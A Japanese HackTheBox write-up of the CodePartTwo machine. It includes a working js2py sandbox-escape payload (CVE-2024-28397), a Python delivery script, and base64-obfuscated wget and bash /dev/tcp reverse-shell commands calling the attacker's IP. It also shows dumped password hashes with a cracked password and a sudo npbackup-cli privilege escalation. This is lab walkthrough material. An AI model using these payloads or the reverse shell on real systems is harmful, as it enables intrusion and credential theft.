---
title: 'CodePartTwo - HTB'
description: 'HackTheBox Machine CodePartTwoのWriteupです。'
pubDate: 2026-01-28
category: 'HTB'
tags: ['HTB', 'Machine', 'Writeup', 'Linux', 'Web', 'js2py', 'npbackup-cli', 'CVE-2024-28397']
---

# CodePartTwo - HTB

## 初期侵入
```bash
nmap 10.129.189.242 -Pn -T4
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
---
nmap 10.129.189.242 -Pn -p 8000 -A
PORT     STATE SERVICE VERSION
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
```

### SSTI
SSTIかなと思い色々実行したが侵入には繋がらなかった。
```js
{{7*7}} = 49
```

### Code Review
Home画面に`DOWNLOAD APP`があり、コードをダウンロードできる

```py
# requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74

# app.py
import js2py
js2py.disable_pyimport()

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

### CVE
[CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)

影響を受けるコンポーネントのバージョン番号:Python 3で動作する最新のjs2py(<=0.74)

> このままだとcmdが実行できずresponsが帰ってこない  
エンコードして送信する
```js
let cmd = "id;"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
  let result;
  for(let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i]
    if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item
    }
    if(item.__name__ != "type" && (result = findpopen(item))) {
      return result
    }
  }
}

findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
```

> `Error: 'NoneType' object is not callable`というerrorが出る  
結果は返ってこなくてもコマンド自体は実行できてるかもしれない`wget`で通信できているか確認してみた  
コマンドの実行ができているので、revers shellが成立する
```js
let cmd = "echo d2dldCBodHRwOi8vMTAuMTAuMTQuMjM6ODE4MS90ZXN0Cg==|base64 -d|bash";

let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
  let result;
  for(let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i]
    if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item
    }
    if(item.__name__ != "type" && (result = findpopen(item))) {
      return result
    }
  }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11

// 10.129.189.242 - - [28/Jan/2026 19:23:50] "GET /test HTTP/1.1" 200 -
```

### Exploit
```py
import requests
from urllib.parse import *

URL = "http://10.129.189.242:8000/"

payload = """
let cmd = "echo KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjMvNDQ0NCAwPiYxKSAmCg==|base64 -d|bash";

let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
  let result;
  for(let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i]
    if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item
    }
    if(item.__name__ != "type" && (result = findpopen(item))) {
      return result
    }
  }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"""

endpoint = "/run_code"
json  = {
  "code": payload
}
headers = {
  "Content-Type": "application/json",
}

r = requests.post(urljoin(URL, endpoint), headers=headers, json=json)
print(r.text)
```

### Revers Shell & SSHアクセス
```bash
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.189.242] 34060
id
uid=1001(app) gid=1001(app) groups=1001(app)
pwd
/home/app/app
ls
app.py
instance
__pycache__
requirements.txt
static
templates
cd instance
ls
users.db
file users.db
users.db: SQLite 3.x database, last written using SQLite version 3031001
sqlite3 users.db
.tables
code_snippet  user
select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5 # sweetangelbabylove
2|app|a97588c0e2fa3a024876339e27aeb42e
```

```bash
ssh marco@10.129.189.242
# sweetangelbabylove
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
```

## 権限昇格
```bash
marco@codeparttwo:/tmp$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```
```bash
marco@codeparttwo:~$ ls -la
total 48
drwxr-x--- 7 marco marco 4096 Jan 28 10:45 .
drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
drwx------ 7 root  root  4096 Apr  6  2025 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
drwx------ 2 marco marco 4096 Apr  6  2025 .cache
drwx------ 3 marco marco 4096 Jan 28 10:42 .gnupg
drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Jan 28 05:59 user.txt

```

> pathsの部分がbackup対象なので/rootに書き換えて実行する
```bash
# npbackup.json
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
    ~~~
```
```bash
marco@codeparttwo:~$ mv backups backups-root
marco@codeparttwo:~$ mv npbackup.conf npbackup-root.conf
marco@codeparttwo:~$ cp npbackup-root.conf npbackup.conf
marco@codeparttwo:~$ vim npbackup.conf
  backup_opts:
      paths:
      - /root
```
```bash
# -c:config_file -b:run backup
marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf -b
2026-01-28 11:12:29,151 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-28 11:12:29,183 :: INFO :: Loaded config E1057128 in /home/marco/npbackup.conf
2026-01-28 11:12:29,194 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2026-01-28 11:12:29,206 :: INFO :: Repository is not initialized or accessible
2026-01-28 11:12:29,206 :: INFO :: Repo is not initialized. Initializing repo for backup operation
2026-01-28 11:12:32,339 :: INFO :: Repo initialized successfully
2026-01-28 11:12:33,072 :: INFO :: Snapshots listed successfully
2026-01-28 11:12:33,073 :: INFO :: No snapshots found in repo default.
2026-01-28 11:12:33,073 :: INFO :: Runner took 3.879504 seconds for has_recent_snapshot
2026-01-28 11:12:33,073 :: INFO :: Running backup of ['/root'] to repo default
2026-01-28 11:12:34,210 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2026-01-28 11:12:34,210 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2026-01-28 11:12:34,211 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2026-01-28 11:12:34,211 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2026-01-28 11:12:34,211 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2026-01-28 11:12:34,211 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2026-01-28 11:12:34,211 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2026-01-28 11:12:34,211 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2026-01-28 11:12:34,212 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 206.612 KiB (40.428 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot fa268e52 saved
2026-01-28 11:12:35,270 :: INFO :: Backend finished with success
2026-01-28 11:12:35,274 :: INFO :: Processed 197.7 KiB of data
2026-01-28 11:12:35,275 :: ERROR :: Backup is smaller than configured minmium backup size
2026-01-28 11:12:35,275 :: ERROR :: Operation finished with failure
2026-01-28 11:12:35,276 :: INFO :: Runner took 6.08291 seconds for backup
2026-01-28 11:12:35,276 :: INFO :: Operation finished
2026-01-28 11:12:35,289 :: INFO :: ExecTime = 0:00:06.142695, finished, state is: errors.

# --dump:標準出力する
marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf --dump /root/root.txt --snapshot-id fa268e52
***
```
> スナップショットIDの指定は--helpの--dumpを見ると最新のIDは指定しなくても良いようになってる。